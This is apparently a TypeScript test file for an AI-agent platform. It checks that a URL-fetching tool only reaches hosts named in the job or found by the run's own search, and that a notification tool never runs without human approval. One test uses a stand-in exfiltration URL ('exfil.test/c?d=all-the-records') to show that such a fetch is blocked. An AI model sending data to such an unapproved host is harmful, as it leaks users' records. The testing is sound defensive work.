import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { db, toJson } from "@/server/db";
import { tools } from "@/server/tools";
import { transport } from "@/server/tools/guarded-http";
import { assertFetchAllowed, fetchAllowList, hostsInText, isHostAllowed, normalizeHost } from "@/server/tools/provenance";
import { fetchUrlTool } from "@/server/tools/impl/fetch-url";
import { createTestOrg } from "../helpers/factory";
import { createHiredWorker, makeJobSpec } from "../helpers/fixtures";
import { NOTIFICATION_INPUT, createApproval, createRun, createToolCall, ctxFor, type Hired } from "../tools/helpers";

/**
 * F-010: `fetch_url` is an unapproved outbound channel in LIVE mode, so a host may only be fetched when this
 * run found it through a search or a human wrote it into the job. Simulated mode is untouched.
 */

type TestOrg = Awaited<ReturnType<typeof createTestOrg>>;

const htmlPage = (body: string) =>
  new Response(body, { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });

describe("fetch_url provenance (live mode)", () => {
  let t: TestOrg;
  let hired: Hired;
  let runId: string;

  beforeAll(async () => {
    t = await createTestOrg("sec-provenance");
    hired = await createHiredWorker(t.organization.id, {
      spec: makeJobSpec({
        objective: "Track AI infrastructure funding, starting from the weekly digest at https://digest.test/ai-infra",
      }),
    });
    runId = (await createRun(t.organization.id, hired)).id;
  });
  afterEach(async () => {
    vi.restoreAllMocks();
    await db.toolCall.deleteMany({ where: { runId } });
  });
  afterAll(async () => {
    await t.cleanup();
  });

  const liveCtx = () => ctxFor(t.organization.id, hired, runId, { simulated: false });

  it("allows a host the job spec names, including its subdomains", async () => {
    // The gate runs before any DNS lookup or request, so it is asserted on its own.
    await expect(assertFetchAllowed(new URL("https://digest.test/ai-infra"), liveCtx())).resolves.toBeUndefined();
    await expect(assertFetchAllowed(new URL("https://docs.digest.test/method"), liveCtx())).resolves.toBeUndefined();
    await expect(assertFetchAllowed(new URL("https://www.digest.test/"), liveCtx())).resolves.toBeUndefined();
  });

  it("allows a host this run's web_search returned", async () => {
    await expect(assertFetchAllowed(new URL("https://news.test/rounds/acme"), liveCtx())).rejects.toMatchObject({
      code: "TOOL_ERROR",
    });

    await createToolCall(runId, hired, "web_search", { query: "ai infra funding" }, { status: "SUCCEEDED" });
    const call = await db.toolCall.findFirstOrThrow({ where: { runId, toolName: "web_search" } });
    await db.toolCall.update({
      where: { id: call.id },
      data: { output: toJson({ results: [{ title: "Round", url: "https://news.test/rounds/acme", snippet: "…" }] }) },
    });

    await expect(assertFetchAllowed(new URL("https://news.test/rounds/acme"), liveCtx())).resolves.toBeUndefined();
  });

  it("refuses a host with no provenance and tells the model to search first", async () => {
    const fetchSpy = vi.spyOn(transport, "fetch").mockResolvedValue(htmlPage("<title>Nope</title>"));
    await expect(
      fetchUrlTool.execute({ url: "https://exfil.test/c?d=all-the-records" }, liveCtx()),
    ).rejects.toMatchObject({ code: "TOOL_ERROR", message: expect.stringContaining("web_search") });
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("does not grant one run's provenance to another run", async () => {
    await createToolCall(runId, hired, "web_search", { query: "x" }, { status: "SUCCEEDED" });
    const call = await db.toolCall.findFirstOrThrow({ where: { runId, toolName: "web_search" } });
    await db.toolCall.update({ where: { id: call.id }, data: { output: toJson({ results: [{ url: "https://news.test/a" }] }) } });

    const otherRun = await createRun(t.organization.id, hired);
    const allowed = await fetchAllowList({ organizationId: t.organization.id, runId: otherRun.id });
    expect(allowed.has("news.test")).toBe(false);
    expect(allowed.has("digest.test")).toBe(true); // the job text still counts
  });

  it("leaves Simulated mode alone — fixture pages are always readable", async () => {
    const page = await fetchUrlTool.execute({ url: "https://news.example/some/article" }, ctxFor(t.organization.id, hired, runId));
    expect(page.simulated).toBe(true);
    // …and a .example host is simulated even when the context is live.
    const live = await fetchUrlTool.execute({ url: "https://news.example/some/article" }, liveCtx());
    expect(live.simulated).toBe(true);
  });

  it("fails open when the provenance lookup itself fails", async () => {
    // The SSRF guard, the tool grant and the per-run call limits still apply — a database blip must not
    // break every research worker.
    vi.spyOn(db.toolCall, "findMany").mockRejectedValue(new Error("connection terminated"));
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    await expect(assertFetchAllowed(new URL("https://anything.test/"), liveCtx())).resolves.toBeUndefined();
  });
});

describe("provenance helpers", () => {
  it("normalizes hosts and matches subdomains only", () => {
    expect(normalizeHost("WWW.Example.COM.")).toBe("example.com");
    const allowed = new Set(["example.com"]);
    expect(isHostAllowed("example.com", allowed)).toBe(true);
    expect(isHostAllowed("www.example.com", allowed)).toBe(true);
    expect(isHostAllowed("docs.example.com", allowed)).toBe(true);
    expect(isHostAllowed("notexample.com", allowed)).toBe(false);
    expect(isHostAllowed("example.com.evil.test", allowed)).toBe(false);
  });

  it("picks hosts out of written text, from URLs and bare domains", () => {
    const hosts = hostsInText("Start at https://digest.test/ai-infra?q=1 and cross-check crunchbase.com, not 12.5 or a word.");
    expect([...hosts].sort()).toEqual(["crunchbase.com", "digest.test"]);
  });

  it("is bounded on huge text", () => {
    const started = performance.now();
    hostsInText(`${"a.test ".repeat(50_000)}https://b.test/${"x".repeat(50_000)}`);
    expect(performance.now() - started).toBeLessThan(250);
  });
});

describe("send_notification can never execute without an APPROVED approval", () => {
  let t: TestOrg;
  let hired: Hired;

  beforeAll(async () => {
    t = await createTestOrg("sec-approval");
    hired = await createHiredWorker(t.organization.id, { withNotifier: true });
  });
  afterAll(async () => {
    await t.cleanup();
  });

  /** Runs one invoke with the given approval state and reports the status the tool layer returned. */
  async function invokeWith(status: "none" | "PENDING" | "REJECTED" | "EXPIRED" | "APPROVED") {
    const run = await createRun(t.organization.id, hired);
    const call = await createToolCall(run.id, hired, "send_notification", NOTIFICATION_INPUT);
    if (status !== "none") await createApproval(t.organization.id, run.id, hired, call.id, "send_notification", status);
    return tools.invoke({
      toolName: "send_notification",
      input: NOTIFICATION_INPUT,
      ctx: ctxFor(t.organization.id, hired, run.id),
      toolCallId: call.id,
    });
  }

  it("blocks every state except APPROVED, and never runs execute()", async () => {
    const execute = vi.spyOn(
      tools.get("send_notification") as { execute: (...args: never[]) => unknown },
      "execute",
    );
    try {
      expect(await invokeWith("none")).toMatchObject({ status: "approval_required" });
      expect(await invokeWith("PENDING")).toMatchObject({ status: "approval_required" });
      expect(await invokeWith("REJECTED")).toMatchObject({ status: "rejected" });
      expect(await invokeWith("EXPIRED")).toMatchObject({ status: "rejected" });
      expect(execute).not.toHaveBeenCalled();

      expect(await invokeWith("APPROVED")).toMatchObject({ status: "ok", output: { delivered: true } });
      expect(execute).toHaveBeenCalledTimes(1);
    } finally {
      execute.mockRestore();
    }
  });

  it("ignores an approval that belongs to a different tool call or another workspace", async () => {
    const run = await createRun(t.organization.id, hired);
    const call = await createToolCall(run.id, hired, "send_notification", NOTIFICATION_INPUT);
    const decoy = await createToolCall(run.id, hired, "send_notification", NOTIFICATION_INPUT);
    await createApproval(t.organization.id, run.id, hired, decoy.id, "send_notification", "APPROVED");

    expect(
      await tools.invoke({
        toolName: "send_notification",
        input: NOTIFICATION_INPUT,
        ctx: ctxFor(t.organization.id, hired, run.id),
        toolCallId: call.id,
      }),
    ).toMatchObject({ status: "approval_required" });

    // Same approval id, different workspace in the context → still not approved.
    const other = await createTestOrg("sec-approval-other");
    try {
      expect(
        await tools.invoke({
          toolName: "send_notification",
          input: NOTIFICATION_INPUT,
          ctx: ctxFor(other.organization.id, hired, run.id),
          toolCallId: decoy.id,
        }),
      ).toMatchObject({ status: "denied" });
    } finally {
      await other.cleanup();
    }
  });
});
